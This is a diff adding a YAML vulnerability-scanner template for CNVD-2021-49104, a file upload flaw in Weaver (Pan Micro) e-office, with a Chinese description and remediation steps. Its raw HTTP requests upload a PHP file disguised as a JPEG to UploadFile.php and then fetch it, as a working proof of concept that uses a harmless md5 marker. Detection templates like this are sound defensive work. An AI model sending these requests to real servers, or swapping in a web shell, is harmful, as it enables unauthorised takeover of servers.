@@ -1,0 +1,41 @@
+id: CNVD-2021-49104
+info:
+  name: Pan Micro E-office File Uploads
+  author:
+  - l0ne1y
+  description: |-
+    泛微e-office存在文件上传漏洞
+    泛微e-office是泛微旗下的一款标准协同移动办公平台。泛微e-office存在文件上传漏洞，攻击者可利用该漏洞获取服务器控制权。
+  severity: high
+  remediation: "官方修复方案：<br />1、升级系统至无漏洞版本，或于官网下载安全补丁\n厂商已提供漏洞修补方案，建议用户下载使用：http://v10.e-office.cn/eoffice9update/safepack.zip
+    \n\n临时修复方案：<br />文件上传：<br />1、服务器端将文件上传目录直接设置为不可执行。<br />2、文件类型检查：建议使用白名单方式（比黑名单更可靠），并结合MIME
+    Type、后缀检查等方式（文件类型做白名单限制）。此外对于图片的处理可以使用压缩函数或resize函数，处理图片的同时破坏其包含的HTML代码。<br />3、使用随机数改写文件名和文件路径，使得用户不能轻易访问自己上传的文件。<br
+    />4、单独设置文件服务器的域名。<br />5、验证文件内容，使用正则匹配恶意代码（过滤恶意代码各种绕过方式，如大小写、BASE64编码）限制上传。<br
+    />6、修复服务器可能存在的解析漏洞。<br />7、严格限制可以修改服务器配置的文件上传如：.htaccess。<br />8、隐藏上传文件路径。<br
+    />9、升级Web Server。<br />10、及时修复Web上传代码。<br />11、不能有本地文件包含漏洞。<br />12、注意0x00截断攻击（PHP更新到最新版本）。"
+requests:
+- matchers:
+  - type: word
+    part: body
+    words:
+    - 94d01a2324ce38a2e29a629c54190f67
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  raw:
+  - |
+    POST /general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId= HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4
+
+    --e64bdf16c554bbc109cecef6451c26a4
+    Content-Disposition: form-data; name="Filedata"; filename="{{randstr}}.php"
+    Content-Type: image/jpeg
+
+    <?php echo md5('CNVD-2021-49104');?>
+
+    --e64bdf16c554bbc109cecef6451c26a4--
+  - |
+    GET /images/logo/logo-eoffice.php HTTP/1.1
+    Host: {{Hostname}}
